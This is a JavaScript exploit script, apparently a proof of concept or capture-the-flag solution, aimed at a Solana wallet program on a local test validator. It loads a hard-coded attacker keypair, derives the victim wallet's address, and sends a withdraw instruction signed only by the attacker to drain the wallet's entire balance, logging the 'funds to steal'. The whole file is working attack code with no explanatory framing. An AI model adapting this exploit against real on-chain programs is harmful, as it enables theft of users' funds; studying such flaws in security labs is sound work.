const {
  Keypair,
  Transaction,
  LAMPORTS_PER_SOL,
  Connection,
  sendAndConfirmTransaction,
  PublicKey,
} = require("@solana/web3.js");

const bs58 = require("bs58");

const { Wallet } = require("wallet-v1");

const authorityPublicKey = new PublicKey(
  bs58.decode("7By5EKRWGRKD5eQSh582u3QPcyuYRi7Me5UHzJ4hvru4")
);
const walletProgramId = new PublicKey(
  bs58.decode("8x3TmaHkHvS7zNEoXLqD1xNLHvnxvgdMTkAZ3Bj43S6g")
);

console.log(`[*] Authority: ${authorityPublicKey}`);
console.log(`[*] Wallet: ${walletProgramId}`);

const connection = new Connection("http://localhost:8899", "confirmed");

// initialize attacker's keys
let attackerSecretKey = Uint8Array.from([
  61, 234, 218, 250, 91, 105, 201, 10, 169, 51, 137, 21, 23, 228, 162, 2, 4, 48,
  158, 95, 41, 153, 14, 78, 38, 72, 140, 218, 108, 69, 149, 213, 91, 248, 110,
  163, 191, 97, 101, 129, 245, 158, 22, 200, 191, 11, 23, 166, 6, 179, 225, 153,
  169, 233, 223, 178, 24, 145, 185, 167, 217, 137, 141, 54,
]);
let attacker = Keypair.fromSecretKey(attackerSecretKey);

(async () => {
  // receive 'tiny' airdrop
  {
    const sig = await connection.requestAirdrop(
      attacker.publicKey,
      1.0 * LAMPORTS_PER_SOL
    );
    await connection.confirmTransaction({ signature: sig });
  }

  const balancePrev = await connection.getBalance(attacker.publicKey);
  console.log(
    `[*] Previous balance of attacker: ${balancePrev / LAMPORTS_PER_SOL} SOL`
  );

  // send exploit TX
  {
    const [walletAddress, _walletBumpSeed] = PublicKey.findProgramAddressSync(
      [authorityPublicKey.toBytes()],
      walletProgramId
    );
    const withdrawAmount = await connection.getBalance(walletAddress);
    console.log(
      `[*] Amount of funds to steal: ${withdrawAmount / LAMPORTS_PER_SOL} SOL`
    );
    const ix = Wallet.withdraw(
      walletProgramId,
      walletAddress,
      authorityPublicKey,
      attacker.publicKey,
      withdrawAmount
    );
    const tx = new Transaction().add(ix);
    await sendAndConfirmTransaction(connection, tx, [attacker]);
  }

  const balanceFinal = await connection.getBalance(attacker.publicKey);
  console.log(
    `[*] Final balance of attacker: ${balanceFinal / LAMPORTS_PER_SOL} SOL`
  );
})();
